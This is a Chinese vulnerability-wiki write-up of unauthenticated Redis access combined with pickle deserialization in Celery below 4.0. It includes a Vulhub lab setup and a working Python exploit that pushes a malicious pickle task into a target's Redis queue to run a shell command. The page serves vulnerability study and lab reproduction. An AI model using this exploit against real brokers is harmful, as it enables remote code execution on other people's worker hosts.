---
source: "Threekiii/Vulnerability-Wiki"
title: "Celery <4.0 Redis未授权访问+Pickle反序列化利用"
product: "Celery/Kombu消息反序列化，Redis作为broker"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "可向正确Redis库/队列写任务、worker接受pickle serializer并消费，Python协议版本兼容；高版本显式启用pickle同有风险"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-b7d7ce88d3f5d09630173808"
entity_id: "ve-b7d7ce88d3f5d09630173808"
schema_version: "1"
---

# Celery <4.0 Redis未授权访问+Pickle反序列化利用

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：可向正确Redis库/队列写任务、worker接受pickle serializer并消费，Python协议版本兼容；高版本显式启用pickle同有风险
- 证据范围：根因消费端不安全反序列化与broker失控组合，不是Redis服务器自身RCE；应以Celery主产品索引保留。

### 本次正文校订

- 按实际内容修正 4 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- <4.0是默认serializer历史而非完整安全边界，accept_content实际配置决定能否消费
- RocketMQ等broker例子需确认Celery/Kombu版本支持，不宜随意列举
- redis-py依赖版本未固定；Python3默认pickle协议随版本改变，需说明worker兼容性
- LPUSH写入生产队列可能影响业务，固定任务元数据/错误响应不代表无副作用，缺删除测试任务/文件说明
- 文件名Celery-4.0易丢失小于号，正文应结构化版本

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。

在Celery < 4.0版本默认使用Pickle进行任务消息的序列化传递，当所用队列服务（比如Redis、RabbitMQ、RocketMQ等等等）存在未授权访问问题时，可利用Pickle反序列化漏洞执行任意代码。

参考阅读：

- https://docs.celeryproject.org/en/stable/userguide/configuration.html
- https://www.bookstack.cn/read/celery-3.1.7-zh/8d5b10e3439dbe1f.md#dhfmrk
- https://docs.celeryproject.org/en/stable/userguide/calling.html#serializers
- https://www.jianshu.com/p/52552c075bc0
- https://www.runoob.com/w3cnote/python-redis-intro.html
- https://blog.csdn.net/SKI_12/article/details/85015803

## 环境搭建

Vulhub执行如下命令启动Celery 3.1.23 + Redis：

```shell
docker-compose up -d
```

## 漏洞复现

漏洞利用脚本`exploit.py`仅支持在python3下使用

```python
import pickle
import json
import base64
import redis
import sys
r = redis.Redis(host=sys.argv[1], port=6379, decode_responses=True,db=0)

ori_str="{\"content-type\": \"application/x-python-serialize\", \"properties\": {\"delivery_tag\": \"16f3f59d-003c-4ef4-b1ea-6fa92dee529a\", \"reply_to\": \"9edb8565-0b59-3389-944e-a0139180a048\", \"delivery_mode\": 2, \"body_encoding\": \"base64\", \"delivery_info\": {\"routing_key\": \"celery\", \"priority\": 0, \"exchange\": \"celery\"}, \"correlation_id\": \"6e046b48-bca4-49a0-bfa7-a92847216999\"}, \"headers\": {}, \"content-encoding\": \"binary\", \"body\": \"gAJ9cQAoWAMAAABldGFxAU5YBQAAAGNob3JkcQJOWAQAAABhcmdzcQNLZEvIhnEEWAMAAAB1dGNxBYhYBAAAAHRhc2txBlgJAAAAdGFza3MuYWRkcQdYAgAAAGlkcQhYJAAAADZlMDQ2YjQ4LWJjYTQtNDlhMC1iZmE3LWE5Mjg0NzIxNjk5OXEJWAgAAABlcnJiYWNrc3EKTlgJAAAAdGltZWxpbWl0cQtOToZxDFgGAAAAa3dhcmdzcQ19cQ5YBwAAAHRhc2tzZXRxD05YBwAAAHJldHJpZXNxEEsAWAkAAABjYWxsYmFja3NxEU5YBwAAAGV4cGlyZXNxEk51Lg==\"}"
task_dict = json.loads(ori_str)
command = 'touch /tmp/celery_success'
class Person(object):
    def __reduce__(self):
        # 未导入os模块，通用
        return (__import__('os').system, (command,))
pickleData = pickle.dumps(Person())
task_dict['body']=base64.b64encode(pickleData).decode()
print(task_dict)
r.lpush('celery',json.dumps(task_dict))
```

```shell
pip install redis
python exploit.py [主机IP]
```

![image-20220301104913810](./.resource/Celery-4.0-Redis未授权访问+Pickle反序列化利用/media/202203011049883.png)


查看结果：

```shell
docker-compose logs celery
```

可以看到如下任务消息报错：

![image-20220301104801643](./.resource/Celery-4.0-Redis未授权访问+Pickle反序列化利用/media/202203011048739.png)


```shell
docker-compose exec celery ls -l /tmp
```

可以看到成功创建了文件`celery_success`

![image-20220301104827599](./.resource/Celery-4.0-Redis未授权访问+Pickle反序列化利用/media/202203011048652.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
